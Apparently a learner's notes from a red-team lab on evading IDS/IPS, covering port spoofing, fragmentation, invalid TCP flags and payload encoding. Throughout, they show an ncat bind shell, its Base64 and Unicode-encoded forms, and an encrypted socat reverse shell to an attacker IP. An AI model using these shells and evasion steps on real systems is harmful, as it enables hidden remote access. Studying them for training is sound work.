---
dg-publish: true
---






- Intrusion Detection System / Intrusion Prevention System
- The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data.

## ==**Manipulate (Source) TCP/UDP Port**==

- Without deep packet inspection, the port numbers are the primary indicator of the service used.
- In other words, network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments.

## ==Use Session Splicing (IP Packet Frag)==

- The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures.
    - If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won’t be triggered.
- Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as [Fragroute](https://www.monkey.org/~dugsong/fragroute/).
    - `fragroute` can be set to read a set of rules from a given configuration file and applies them to incoming packets.

## ==Sending Invalid Packets==

- Nmap also lets you send packets with custom TCP flags, including invalid ones. The option `--scanflags` lets you choose which flags you want to set.
    - `URG` for Urgent
    - `ACK` for Acknowledge
    - `PSH` for Push
    - `RST` for Reset
    - `SYN` for Synchronize
    - `FIN` for Finish

## ==Payload Manipulation==

### **Encode to Base64 format**

- Can use one of the many online tools that encode your input to Base64. Alternatively, we can use `base64` commonly found on Linux systems.

```Shell
cat input.txt
ncat -lvnp 1234 -e /bin/bash

base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==
```

### URL Encoding

- URL encoding converts certain characters to the form %HH, where HH is the hexadecimal ASCII representation. English letters, period, dash, and underscore are not affected.

```Shell
urlencode ncat -lvnp 1234 -e /bin/bash
```

### Use Escaped Unicode

- Some applications will still process your input and execute it properly if you use escaped Unicode. There are multiple ways to use escaped Unicode depending on the system processing the input string.
- It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.
- `ncat -lvnp 1234 -e /bin/bash` becomes
    -  `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`

## Encrypt Communication Channel

- Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
- One direct approach is to create the necessary encryption key on the attacker’s system and set `socat` to use the encryption key to enforce encryption as it listens for incoming connections.

`openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt`

- Listening on the victim system, we execute this :

```Shell
socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

- On attacker’s system, run cat /etc/passwd

```Shell
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
```